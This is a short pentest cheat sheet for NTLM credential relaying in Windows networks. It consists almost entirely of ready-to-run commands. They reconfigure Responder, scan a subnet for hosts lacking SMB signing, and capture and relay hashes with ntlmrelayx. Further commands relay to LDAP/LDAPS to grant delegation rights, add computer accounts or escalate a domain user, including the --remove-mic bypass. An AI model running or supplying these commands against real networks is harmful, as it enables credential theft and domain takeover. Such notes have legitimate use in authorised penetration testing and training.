# Credentials Relaying

**to perform Credentials Relaying attack,No SMB Signing is required**
```
Now off  to capture the hashes, but we first need to change a little configuration in the responder.conf file (/usr/share/responder/responder.conf)
SMB = Off     # Turn this off
HTTP = Off    # Turn this off
```



```
python -c 'for i in range(1,254): print "192.168.1.%d" % i' > Targets.txt
nmap --script smb-security-mode.nse -p445 --iL target.txt
responder.py -I eth0 -rdwv
ntlmrelayx.py -tf Targets.txt -socks -smb2support
```

### More NTLM Relay Over LDAP
```
ntlmrelayx.py -t ldaps://192.168.1.10 --delegate-access -smb2support --remove-mic
ntlmrelayx.py -t ldaps://192.168.1.10 --add-computer -smb2support --remove-mic
ntlmrelayx.py -t ldap://192.168.1.10 --escalate-user <domain user/computer> - smb2support --remove-mic
```
